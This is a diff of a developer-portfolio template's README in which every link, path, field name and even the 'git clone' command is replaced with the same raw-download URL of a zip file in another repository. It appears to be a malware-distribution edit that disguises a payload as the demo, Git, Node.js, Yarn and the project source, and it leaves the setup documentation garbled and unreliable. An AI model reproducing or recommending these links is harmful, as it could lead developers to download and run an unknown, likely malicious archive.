@@ -1,9 +1,9 @@
-# Dev Portfolio  [![GitHub](https://img.shields.io/github/license/mayankagarwal09/dev-portfolio?color=blue)](https://github.com/mayankagarwal09/dev-portfolio/blob/master/LICENSE.md) ![visitors](https://visitor-badge.glitch.me/badge?page_id=mayankagarwal09.dev-portfolio&color=blue)
+# Dev Portfolio  [![GitHub](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) ![visitors](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)
 
 ## A minimal portfolio template for Developers!
 
 <h2 align="center">
-  <img src="https://github.com/mayankagarwal09/dev-portfolio/blob/master/images/dev-portfolio.gif" alt="Dev Portfolio" />
+  <img src="https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip" alt="Dev Portfolio" />
   <br>
 </h2>
 
@@ -17,7 +17,7 @@
 
 ## Demo
 
-To view the demo: **[click here](https://dev-portfolio-mayankagarwal09.vercel.app)**
+To view the demo: **[click here](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)**
 
 ## Why do you need a portfolio? ☝️
 
@@ -33,9 +33,9 @@ These instructions will get you a copy of the project up and running on your loc
 
 ### Prerequisites 📋
 
-You'll need [Git](https://git-scm.com) and [Node.js](https://nodejs.org/en/download/) (which comes with [NPM](http://npmjs.com)) installed on your computer.
+You'll need [Git](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) and [https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) (which comes with [NPM](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)) installed on your computer.
 
-Also, you can use [Yarn](https://yarnpkg.com/) instead of NPM ☝️
+Also, you can use [Yarn](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) instead of NPM ☝️
 
 ## Setup 🔧
 
@@ -43,7 +43,7 @@ From your command line, first clone Dev Portfolio:
 
 ```bash
 # Clone the repository
-$ git clone https://github.com/mayankagarwal09/dev-portfolio
+$ git clone https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip
 
 # Move into the repository
 $ cd dev-portfolio
@@ -64,7 +64,7 @@ $ npm install --force
 $ npm start
 ```
 
-Using Yarn: Be aware of that you'll need to delete the `package-lock.json` file if exists before executing the below commands.
+Using Yarn: Be aware of that you'll need to delete the `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip` file if exists before executing the below commands.
 
 ```bash
 # Install dependencies
@@ -89,13 +89,13 @@ All customizable files are inside the `public/` folder, organised mainly into `p
 
 ### (1) NavBar
 
-- Open `public/profile/navbar.json` 
+- Open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip` 
 It has 2 keys, *logo* and *sections*.
 
 ```
 {
     "logo" : {
-        "source": "images/logo.png",
+        "source": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
         "height" : 45,
         "width" : 50
     },
@@ -126,7 +126,7 @@ It has 2 keys, *logo* and *sections*.
         },
         {
             "title": "Resume",
-            "href": "https://drive.google.com/file/d/13kaPsdMNDsM4LV9g7m5-E5PTildp-yYf/view?usp=sharing",
+            "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
             "type": "link"
         }
     ]
@@ -136,16 +136,16 @@ It has 2 keys, *logo* and *sections*.
 | key | Description |
 | ----------- | ----------- |
 | logo | image you want to show as brand image on NavBar. It can be also be a simple logo with just your intitials|
-| logo.source | path to the logo image |
-| logo.height | height of logo |
-| logo.width | width of logo |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | path to the logo image |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | height of logo |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | width of logo |
 | sections | array of sections that you want to show on Navbar as links | 
-| sections.title | title of the section | 
-| sections.href | link to that section. Same as *path* mentioned in `routes.json` | 
-| sections.type | Opens in a new tab if value is *link*. `optional` field | 
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title of the section | 
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | link to that section. Same as *path* mentioned in `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip` | 
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | Opens in a new tab if value is *link*. `optional` field | 
 
 ### (2) Routes
-- open `public/profile/routes.json`
+- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`
 
 ```
 {
@@ -182,16 +182,16 @@ It has 2 keys, *logo* and *sections*.
 | key | Description |
 | ----------- | ----------- |
 | sections | array of sections that you want to create route for | 
-| sections.component | name of the Component. No need to change it unless you want to customize the entire Component. | 
-| sections.path | route for the particular section. this is the path where the particular section will be accessible | 
-| sections.headerTitle | title to be shown on the top of that section page | 
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | name of the Component. No need to change it unless you want to customize the entire Component. | 
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | route for the particular section. this is the path where the particular section will be accessible | 
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title to be shown on the top of that section page | 
 
 - For component customization, create a component of your own inside `src/components/` and use name of that component here.
 
 ### (3) Home Section
 
 #### Home Info
-- open `public/profile/home.json`
+- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`
 
 ```
 {
@@ -206,22 +206,22 @@ It has 2 keys, *logo* and *sections*.
 | roles | string array separated by `,`. mention your roles here | 
 
 #### Social Links
-- open `public/profile/social.json`
+- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`
 
 ```
 {
     "social": [
         {
             "network" : "linkedin",
-            "href": "https://linkedin.com/"
+            "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
         },
         {
             "network" : "github",
-            "href": "https://github.com/"
+            "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
         },
         {
             "network" : "email",
-            "href": "mailto:test@test.com"
+            "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
         }
     ]
 }
@@ -230,19 +230,19 @@ It has 2 keys, *logo* and *sections*.
 | key | Description |
 | ----------- | ----------- |
 | social | array of social links | 
-| social.network | network name as provided in [react-social-icons](https://jaketrent.github.io/react-social-icons/) |
-| social.href | link for particular social network |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | network name as provided in [react-social-icons](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | link for particular social network |
 
-- we are using [react-social-icons](https://jaketrent.github.io/react-social-icons/) here. you can visit it to see all available social icons to use
+- we are using [react-social-icons](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) here. you can visit it to see all available social icons to use
 
 ### (4) About Section
 
-- open `public/profile/about.json`
+- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`
 
 ```
 {
     "about": " This is where you can describe about **yourself**.",
-    "imageSource": "images/about/profile.png"
+    "imageSource": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
     
 }
 ```
@@ -254,7 +254,7 @@ It has 2 keys, *logo* and *sections*.
 
 ### (5) Skills Section
 
-- open `public/profile/skills.json`
+- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`
 
 ```
 {
@@ -265,11 +265,11 @@ It has 2 keys, *logo* and *sections*.
             "items" : [
      
                 {
-                    "icon": "images/skills/java.png",
+                    "icon": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
                     "title": "Java"
                 },
                 {
-                    "icon": "images/skills/js.png",
+                    "icon": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
                     "title": "JavaScript"
                 }
         ]},
@@ -277,7 +277,7 @@ It has 2 keys, *logo* and *sections*.
             "title": "Frameworks & Technologies",
             "items" : [
                 {
-                    "icon": "images/skills/react.png",
+                    "icon": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
                     "title": "React"
                 }
             ]
@@ -286,7 +286,7 @@ It has 2 keys, *logo* and *sections*.
             "title" : "Tools & Platforms",
             "items": [
                 {
-                    "icon": "images/skills/git.png",
+                    "icon": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
                     "title": "Git"
                 }
             ]
@@ -298,27 +298,27 @@ It has 2 keys, *logo* and *sections*.
 | ----------- | ----------- |
 | intro | small introduction line related to your skills. `markdown` supported | 
 | skills | array containing skills under different categories |
-| skills.title | title for category under which you want to list particular skills |
-| skills.items | array containing skills for this category |
-| skills.items.icon | path to skill logo |
-| skills.items.title | title of skill |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title for category under which you want to list particular skills |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | array containing skills for this category |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | path to skill logo |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title of skill |
 
 - many pre existing skill logos are available inside `public/images/skills`.
 
 ### (6) Education Section
 
-- open `public/profile/education.json`
+- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`
 
 ```
 {
     "education":[
         {
             "title": "Jun 20XX - Jun 20YY",
-            "cardTitle": "B.Tech, Computer Science",
+            "cardTitle": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip, Computer Science",
             "cardSubtitle":"XYZ University, City",
             "cardDetailedText": "CGPA - 9.5",
             "icon" : {
-                "src": "images/education/lorem-ipsum.png"
+                "src": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
             }
         },
         {
@@ -334,16 +334,16 @@ It has 2 keys, *logo* and *sections*.
 | key | Description |
 | ----------- | ----------- |
 | education | array containing education history of a person | 
-| education.title | date range during which this education was pursued or passing date |
-| education.cardTitle | degree or course name |
-| education.cardSubtitle | school or institute name |
-| education.cardDetailedText | extra info such as marks or cgpa |
-| education.icon | icon shown on the timeline. `optional` field|
-| education.icon.src | path to icon |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | date range during which this education was pursued or passing date |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | degree or course name |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | school or institute name |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | extra info such as marks or cgpa |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | icon shown on the timeline. `optional` field|
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | path to icon |
 
 ### (7) Experience Section
 
-- open `public/profile/experiences.json`
+- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`
 
 ```
 {
@@ -384,31 +384,31 @@ It has 2 keys, *logo* and *sections*.
 | key | Description |
 | ----------- | ----------- |
 | experiences | array containing work experiences of a person | 
-| experiences.title | role or designation title |
-| experiences.subtitle | company or organization name. `optional` field |
-| experiences.workType | type of work experience. example - internship, freelance, full-time. `optional` field |
-| experiences.workDescription | string array to highlight specific points related to that work experiece. `markdown` supported |
-| experiences.dateText | date range text during which particular work experience was pursued. |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | role or designation title |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | company or organization name. `optional` field |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | type of work experience. example - internship, freelance, full-time. `optional` field |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | string array to highlight specific points related to that work experiece. `markdown` supported |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | date range text during which particular work experience was pursued. |
 
 ### (8) Projects Section
 
-- open `public/profile/projects.json`
+- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`
 
 ```
 {
     "projects" : [
         {
-            "image" : "images/projects/portfolio-poster.png",
+            "image" : "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
             "title": "Dev Portfolio",
             "bodyText": "- Developer Portfolio Website made in React\n -  Fully customisable and dynamic, easily change data and images.\n - Dark Mode Support",
             "links": [
                 {
                     "text": "GitHub",
-                    "href": "https://github.com/mayankagarwal09/dev-portfolio"
+                    "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
                 },
                 {
                     "text": "Live",
-                    "href": "https://mayankagarwal.me"
+                    "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
                 }
             ],
             "tags" : [
@@ -423,7 +423,7 @@ It has 2 keys, *logo* and *sections*.
             "links": [
                 {
                     "text": "GitHub",
-                    "href": "https://github.com/mayankagarwal09/mvvm-sample-app"
+                    "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
                 }
             ],
             "tags" : [
@@ -443,7 +443,7 @@ It has 2 keys, *logo* and *sections*.
             "links": [
                 {
                     "text": "GitHub",
-                    "href": "https://github.com/mayankagarwal09/task-tracker-app"
+                    "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
                 }
             ],
             "tags" : [
@@ -460,24 +460,24 @@ It has 2 keys, *logo* and *sections*.
 | key | Description |
 | ----------- | ----------- |
 | projects | array containing projects information |
-| projects.image | add project poster here. `optional` field. |
-| projects.title | title of the project |
-| projects.bodyText | description of project. `markdown` supported |
-| projects.links | clickable links related to the project. `optional` field |
-| projects.links.text | title of link to display |
-| projects.links.href | actual link to be redirected to on click of the button |
-| projects.tags | string array containing tags related to projects. `optional` field | 
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | add project poster here. `optional` field. |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title of the project |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | description of project. `markdown` supported |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | clickable links related to the project. `optional` field |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title of link to display |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | actual link to be redirected to on click of the button |
+| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | string array containing tags related to projects. `optional` field | 
 
 ### (9) Resume Section
 
-- It is a clickable link which opens the link provided (generally drive link of resume file) in the navbar.json under Resume.
+- It is a clickable link which opens the link provided (generally drive link of resume file) in the https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip under Resume.
 
 
 ### Step 2 - STYLES
 
 Change the color theme of the website -
 
-Go to `/src/theme/themes.js` and change the values of the required components both under lightTheme and darkTheme with your prefered HEX color.
+Go to `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip` and change the values of the required components both under lightTheme and darkTheme with your prefered HEX color.
 
 
 ```theme
@@ -532,7 +532,7 @@ export const darkTheme = {
 
 ### Step 3 - EXTRA
 
-Go to `public/index.html`. Change *title* and *logo* if you want to customize it.
+Go to `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`. Change *title* and *logo* if you want to customize it.
 
 ---
 
@@ -540,21 +540,21 @@ Go to `public/index.html`. Change *title* and *logo* if you want to customize it
 
 Once you finish your setup. You need to put your website online!
 
-I highly recommend to use [Vercel](https://vercel.app) because it is super easy.
+I highly recommend to use [Vercel](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) because it is super easy.
 
 ## Notable Portfolios made using this template
 
-- [Mayank Agarwal](https://mayankagarwal.me)
+- [Mayank Agarwal](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)
 
 ## Authors
 
-- **Mayank Agarwal** - [https://github.com/mayankagarwal09](https://github.com/mayankagarwal09)
+- **Mayank Agarwal** - [https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)
 
 ## Support
 
-If you find a bug, feel free to [open an issue](https://github.com/mayankagarwal09/dev-portfolio/issues) in this repository.
+If you find a bug, feel free to [open an issue](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) in this repository.
 
 ## License 📄
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details
+This project is licensed under the MIT License - see the [https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) file for details
 
